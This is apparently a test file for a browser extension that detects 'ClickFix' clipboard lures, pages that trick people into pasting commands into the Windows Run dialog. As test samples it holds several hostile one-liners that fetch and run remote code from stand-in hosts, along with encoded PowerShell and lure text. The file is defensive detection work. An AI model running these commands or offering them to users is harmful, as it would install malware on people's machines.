import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isVisibleIn, scoreClipboard } from '../../extension/src/core/clipboard-score.ts';

const LURE_PAGE =
  'Verify you are human. Press Windows + R, then press Ctrl + V and Enter to complete verification.';

function hidden(text: string, pageText = LURE_PAGE) {
  return scoreClipboard({ text, scriptWritten: true, visibleOnPage: false, pageText });
}

test('typical ClickFix commands are stopped', () => {
  const samples = [
    'powershell -w h -c "iex(irm https://bad.example/x)" # I am not a robot - reCAPTCHA Verification ID: 4821',
    'mshta https://bad.example/verify.hta # ✅ I am not a robot',
    'cmd /c start /min powershell -EncodedCommand SQBFAFgAIAAoAEkAUgBNACAAaAB0AHQAcAA=',
    'powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadString(\'http://1.2.3.4/a\') | iex"',
    'curl -fsSL https://bad.example/install.sh | bash',
    'osascript -e \'do shell script "curl -s https://bad.example/a | sh"\'',
    'msiexec /i https://bad.example/update.msi /qn',
    'rundll32 \\\\1.2.3.4\\share\\a.dll,Run',
  ];
  for (const sample of samples) {
    const verdict = hidden(sample);
    assert.equal(verdict.high, true, `should stop: ${sample} (${verdict.reasons.join(', ')})`);
  }
});

test('a hidden write alone is enough when the text is a command', () => {
  const verdict = hidden('powershell -c "iex(irm https://bad.example/x)"', 'Click the checkbox to continue.');
  assert.equal(verdict.high, true);
  assert.ok(verdict.reasons.includes('hidden-write'));
});

test('ordinary text is never stopped', () => {
  const samples = [
    'Hello! See you tomorrow at 10.',
    'https://example.com/article?id=5',
    'Order number 123-456-789',
    'npm install express',
    'git clone https://github.com/user/repo.git',
  ];
  for (const sample of samples) {
    assert.equal(hidden(sample).high, false, `should allow: ${sample}`);
  }
});

test('a visible command copied with a copy button on a normal page is allowed', () => {
  const page = 'To list processes run: powershell Get-Process | Sort-Object CPU';
  const verdict = scoreClipboard({
    text: 'powershell Get-Process | Sort-Object CPU',
    scriptWritten: true,
    visibleOnPage: true,
    pageText: page,
  });
  assert.equal(verdict.high, false);
});

test('an install line copied by the person from a normal page is allowed', () => {
  const text = '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"';
  const verdict = scoreClipboard({ text, scriptWritten: false, visibleOnPage: true, pageText: `Install: ${text}` });
  assert.equal(verdict.high, false);
});

test('a heavily disguised command is stopped even when copied by hand', () => {
  const text = 'powershell -w hidden -enc SQBFAFgAIAAoAEkAUgBNACAAaAB0AHQAcAA6AC8ALwBiAGEAZAA=';
  const verdict = scoreClipboard({ text, scriptWritten: false, visibleOnPage: true, pageText: text });
  assert.equal(verdict.high, true);
});

test('Russian lure pages are recognised', () => {
  const verdict = scoreClipboard({
    text: 'powershell -c "iex(irm https://bad.example/x)"',
    scriptWritten: false,
    visibleOnPage: true,
    pageText: 'Подтвердите, что вы не робот: нажмите Win + R, вставьте и нажмите Enter.',
  });
  assert.equal(verdict.high, true);
  assert.ok(verdict.reasons.includes('run-instructions'));
});

test('visibility check compares the start of the text, ignoring spacing and case', () => {
  assert.equal(isVisibleIn('Hello   World', 'Say hello world to everyone'), true);
  assert.equal(isVisibleIn('powershell -c x', 'Nothing here'), false);
});
